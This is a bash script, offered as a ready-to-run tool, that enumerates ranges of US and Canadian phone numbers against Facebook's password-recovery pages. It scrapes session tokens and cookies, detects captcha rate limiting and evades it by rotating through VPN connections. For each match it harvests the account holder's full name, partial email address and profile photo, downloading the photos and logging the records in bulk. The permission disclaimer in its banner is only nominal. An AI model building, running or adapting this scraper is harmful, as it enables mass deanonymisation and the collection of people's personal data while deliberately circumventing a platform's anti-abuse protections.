#!/usr/bin/env bash

NN=$(echo -e "\e[0;0;0m")  #Revert fonts to standard color
X92=$(echo -e "\e[0;92m")  #Green Good
XX2=$(echo -e "\e[1;92m")  #
X93=$(echo -e "\e[0;93m")  #
XX3=$(echo -e "\e[1;93m")  #
XX1=$(echo -e "\e[1;91m")  #
X97=$(echo -e "\e[0;97m")  #White Good
X98=$(echo -e "\e[0;98m")  #Green Good
X10=$(echo -e "\e[4;92m")  # Green
###############################################################################################################
echo $XX3""
echo "########################################################################################################|"
echo "|                         FACEBOOK USER PHONE NUMBER ENUMERATOR - v.0.22x                               |"
echo "|                              (Privacy and Security - LOL @ Facebook)                                  |"
echo "(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)(_)_(_)"
echo "|                                  ____ __  __ ___   _  __ ____                                         |"
echo "|                                 / __// / / // _ \ / |/ // __/                                         |"
echo "|                                / _/ / /_/ // ___//    // _/                                           |"
echo "|                               /_/   \____//_/   /_/|_//___/                                           |"
echo "|_______________________________________________________________________________________________________|$NN"
echo $XX2"|                                                                                                       #"
echo "|   Please, use this only on phone number you have permission to use, we take no responsibility for     #"
echo "|                     misuse or abuse of the Facebook password recovery system!                         #"
echo "|_______________________________________________________________________________________________________#"
echo "$NN"
sleep 1
echo $X92"[*] Testing your setup ..."
echo ""
V=`nmcli -m multiline -p con list|grep -i 'vpn' -B 1|grep -i '^UUID'|awk {'print $2'}|wc -l`
echo -e "[*] Number of VPNs you have setup :" $V ;
	if [ $V -lt 1 ]; then
echo "[*] Don't have enough VPNs setup, goodbye"
sleep 3
exit
else
echo "[*] OK, Your system looks ready"
echo "$NN"
sleep 3
  fi
echo $X97""
echo "[*] Please Read "
echo "_________________________________________________________________________________________________________"
echo "[*] It is probably important that you save the VPN user/pass in network manager or you will get prompted each switch" 
echo ""
echo "[*] Make sure you have created the fb_photos directory: mkdir fb_photos"
echo ""
echo "[*] Also, make sure you enter a number to start that is equal or lower than the second number or the script will shit"
echo ""
echo "[*] Pictures with Facebook user name and phone number will be saved into the folder fb_photos/"
echo ""
echo "[*] It will also save all the data collected in a json format into a master log file"
echo ""
echo "[*] Some numbers found will only display the phone number as the name."
echo "_________________________________________________________________________________________________________"
sleep 2
echo "$NN"
################################################################################################################
#http://fonefinder.net/
#http://www.searchbug.com/tools/landline-or-cellphone.aspx
#https://www.telcodata.us/search-area-code-exchange-detail?npa=703&exchange=980
################################################################################################################
NOW=$(date +"%m-%d-%y")
CK=$(mktemp -t ck-$$.XXXXXXXXXX)
UUD=$(mktemp -t uud-$$.XXXXXXXXXX)
LGF=$(mktemp -t log-$$.XXXXXXXXXX)
PRG=$(mktemp -t prg-$$.XXXXXXXXXX)
TMP=$(mktemp -t tmp-$$.XXXXXXXXXX)
SPC=$(mktemp -t spc-$$.XXXXXXXXXX)
################################################################################################################

################################################################################################################
###Network Manager VPN switch Random Gen Function |
nmvpn() {
nmcli -m multiline -p con list|grep -i 'vpn' -B 1|grep -i '^UUID'|awk {'print $2'} > $UUD
D=$(wc -l < $UUD)
AUID=`nmcli -m multiline -p con status |grep -e "VPN:                                    yes" -B 5| 
grep -i 'UUID'|awk {'print $2'}`
     echo -e "Active VPN UUID found: " $AUID "Bringing down" ;
nmcli con down uuid $AUID
RN=$(shuf -i1-$D -n1)
line=$(sed -n "$RN p" "$UUD")
     echo " New VPN UUID: " $line;
nmcli con up uuid $line
IPN=`curl -s http://checkip.amazonaws.com/  --connect-timeout 4 --max-time 5`
     echo "Your new IP is : "$XX3 $IPN "$NN";
}
################################################################################################################
###IP and Proxy prep work
IPU=`curl -s http://checkip.amazonaws.com/ --connect-timeout 3`
if [ -n $IPU ];then
echo "Your IP is currently :"$XX3 $IPU $NN "Great, now for user input";
else
echo "Connection issues, trying new VPN."
nmvpn
fi
sleep 2
echo ""
echo -e $X97"---------------------------------------------------\n$NN"
################################################################################################################
###User Input
read -p $X97"Enter in a US or Canadian area code and first 3 digits of a mobile phone number (ex: 408666): " code
read -p "Enter in the starting last (exactly) four digits of the phone number: " pnf
read -p "Enter in the ending last (exactly) four higher digits of the phone number: " pne
echo "$NN"

	echo -e $X92"[*] Testing all numbers between : 1"$code$pnf "& 1"$code$pne "$NN";

###Begins main body's for loop to iterate through all the phone numbers

for i in `seq $code$pnf $code$pne`;do
echo $X98"[*] Trying number :" $i"$NN";

curl -skL --connect-timeout 3 "https://www.facebook.com/login/identify?ctx=recover&lwv=110" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" > $TMP

###Grab Token
token=`cat $TMP|sed -e s'/value/\nvalue/'g|sed -e s'/" autocomplete/\n/'g|grep -i 'value="A'|sed -e s'/value="//'g| uniq`
###Grab Cookie
cookie=`cat $TMP|sed -e s/'_js_datr"\,"/\n_js_datr:/'g|grep -i '_js_datr'|sed -e s'/"\,/\n/'g|grep -i '_js_datr'|sed -e s'/:/\n/'g|grep -v -e "_js_datr"|sort`

###Giving lda variable a conditional value
lda=`curl -skL --request POST --connect-timeout 3 "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" -H "Referer: https://www.facebook.com/login/identify?ctx=recover&lwv=110" -H "Cookie: _js_datr=$cookie;" -c $CK -d "__user=0&__a=1&did_submit=Search&lsd=$token&email=$i"|sed -e s'/\\\""/\n /'g|sed -e s'/ldata/\nldata/'g|grep -i 'ldata'`

###Testing wheather the phone number doesn't exist in FB and if there is captcha
Q=$(echo -n $lda | wc -c)

echo -e $X97"[*] ldata count:" $Q "$NN";

if [ $Q -gt 11000 ];
    then
    echo -e $XX1"[*] Captcha rate limiting discovered. Clearing cookies & getting new vpn IP $NN"
    nmvpn
elif [ $Q -lt 10999 ] && [ $Q -gt 350 ];
    then 
    echo -e "[*] Number not found in Facebook."
elif [ $Q -lt 200 ]; 
    then
    echo -e $XX1"[*] Lost connection for some reason, moving on. $NN"
    sleep 3
elif [ $Q -lt 350 ] && [ $Q -gt 201 ];
    then 
    echo -e $X97"[*] Facebook user match found for $i!!!$NN"

###Info Call
curl -skL --connect-timeout 3 "https://www.facebook.com/recover/initiate?$lda" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" -H "Referer: https://www.facebook.com/login/identify?ctx=recover" -b $CK -c $CK > $SPC

###Big Nasty sed shithole to parse the return html 
cat $SPC |sed -e s'/Email me a link/\nEmail me a link/'g|sed -e s'/class="fsm fwn fcg"/\nclass="fsm fwn fcg/'g|grep -i 'Email me a link'|sed -e s'/<\/strong><br \/><div>/ /'g|sed -e s'/<\/div>/ /'g |sed -e s'/<div/ /'g|sed -e s'/>/ /'g|sed -e s'/"/ /'g|sed -e s'/<\/label/\n/'g|sed -e s'/fsl fwb/\nfsl fwb/'g|sed -e s'/fsl fwb fcb  /full_name /'g|sed -e s'/Email me a link to reset my password/pemail/'g|sed -e s'/http/\nhttp/'g|sed -e s'/usedef=1/usedef=1\n/'g|sed -e s'/&#064;/@/'g|sed -e s'/amp;//'g > $PRG

###Grabbing key values / phone number was already set to $i
full_name=`cat $PRG|grep -i 'full_name'|sed -e s'/full_name //'g`
p_email=`cat $PRG|grep -i 'pemail'|sed -e s'/pemail //'g`
photo=`cat $PRG|grep -i 'http'|sed -e s'/square/full/'g`

###Test to see if Name is empty in order to avoid wget errors
A=$(echo -n $full_name |grep -o '[[:alpha:]]'|wc -l)
W=$(echo -n $full_name | wc -c)
if [ $W == 0 ];
then
   echo $X93"[*] Real phone number found, but$NN"$X97" NO $NN"$X93" additional information given.$NN"
   echo "{'full_name': " ", 'phone': "$i ", 'partial_email': " ", 'photo': ""}"|tee -a Master_FB_Test.log;
   echo -e $XX2"----------------NEXT--------NEXT-----------------------$NN"
elif [ $A == 0 ];
then
   echo $X93"[*] Real phone number found, $NN"$X97" ONLY LIMITED $NN"$X93" additional information.$NN"
   echo "{'full_name': " ", 'phone': "$i ", 'partial_email': "$p_email ", 'photo': ""}" |tee -a Master_FB_Test.log;
   echo -e $XX2"----------------NEXT--------NEXT-----------------------$NN"
else
echo -e $XX2"---------------------------------------------------"
echo -e	"\tFull_Name     :  " $full_name;
echo -e	"\tPhone_Number  :  " $i;
echo -e	"\tPartial_Email :  " $p_email;
P=`echo -e $full_name$i"_.jpg"|sed -e s'/ /_/'g`
echo -e	"\tProfile_Photo :  " $P;
echo -e "---------------------------------------------------$NN"
###Saving Records 
echo "{'full_name': "$full_name ", 'phone': "$i ", 'partial_email': "$p_email ", 'photo': "$P"}" |tee -a Master_FB_Test.log;
###wgets FB profile pic if its available
wget $photo -O fb_photos/$P --no-check-certificate -t 1 --connect-timeout=3 --quiet 
echo -e "[*] Photo with user informtion saved to: /fb_photos/"$P "Saving data to log";
echo -e $XX2"----------------NEXT--------NEXT-----------------------$NN"
echo "" > $CK    ###Clear any data left in the cookies variable again
echo "";
    fi
  fi
done
